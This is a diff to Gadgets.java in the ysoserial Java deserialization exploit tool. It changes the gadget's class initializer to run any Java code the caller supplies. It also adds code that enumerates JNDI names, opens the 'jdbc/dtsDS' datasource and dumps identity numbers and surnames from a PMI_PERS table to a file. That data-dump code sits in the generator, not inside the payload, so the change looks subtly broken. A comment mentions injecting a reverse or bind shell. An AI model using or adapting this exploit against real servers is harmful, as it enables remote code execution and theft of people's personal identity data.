@@ -23,6 +23,16 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import java.io.File;
+import java.io.PrintWriter;
+import java.sql.Connection;
+import java.sql.ResultSet;
+import java.sql.Statement;
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NameClassPair;
+import javax.naming.NamingEnumeration;
+import javax.sql.DataSource;
 
 
 /*
@@ -101,7 +111,7 @@ public class Gadgets {
         return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
     }
 
-    public static Object createSysInfoTemplatesImpl ( final String command ) throws Exception {
+    public static Object createJavaCommandTemplatesImpl ( final String command ) throws Exception {
         if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
             return createTemplatesImpl(
                 command,
@@ -110,13 +120,13 @@ public class Gadgets {
                 Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
         }
 
-        return createSysInfoTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+        return createJavaCommandTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
     }
     
     
     
 
-    public static <T> T createSysInfoTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
+    public static <T> T createJavaCommandTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
             throws Exception {
         final T templates = tplClass.newInstance();
 
@@ -129,7 +139,12 @@ public class Gadgets {
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
         //java.lang.System.out.println("asd");
         //clazz.makeClassInitializer().insertAfter("long t = System.currentTimeMillis();java.lang.System.out.println(\"asd\"+t);");
-        clazz.makeClassInitializer().insertAfter("System.getProperties().list(System.out);");
+        //"System.getProperties().list(System.out);"
+        System.out.println(System.getProperty("domain.home"));
+        System.out.println(System.getProperty("oracle.deployed.app.dir"));
+        
+        System.getProperties().list(System.out);
+        clazz.makeClassInitializer().insertAfter(command);
         System.getProperties().getProperty("domain.home");
         //domain.home
         //portlet.oracle.home
@@ -142,7 +157,10 @@ public class Gadgets {
         //weblogic.home
         //user.dir
         
-        //clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"touch /tmp/testasdf\"");
+        javax.naming.NamingEnumeration<javax.naming.NameClassPair> namedEnum = (new javax.naming.InitialContext()).list("java:comp/env");while(namedEnum.hasMore()){System.out.println(namedEnum.next().getName());}
+        
+        javax.sql.DataSource ds = (DataSource) (new javax.naming.InitialContext()).lookup( "jdbc/dtsDS" );java.sql.ResultSet rs = ds.getConnection().createStatement().executeQuery("select hkid, eng_surname from PMI_PERS");java.io.File file = new File("file.txt");java.io.PrintWriter printWriter = new java.io.PrintWriter(file);while (rs.next()) {printWriter.println(String.format("User #%d: %-15s %s", 1, rs.getString("hkid"), rs.getString("eng_surname")));}
+//clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"touch /tmp/testasdf\"");
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
         CtClass superC = pool.get(abstTranslet.getName());
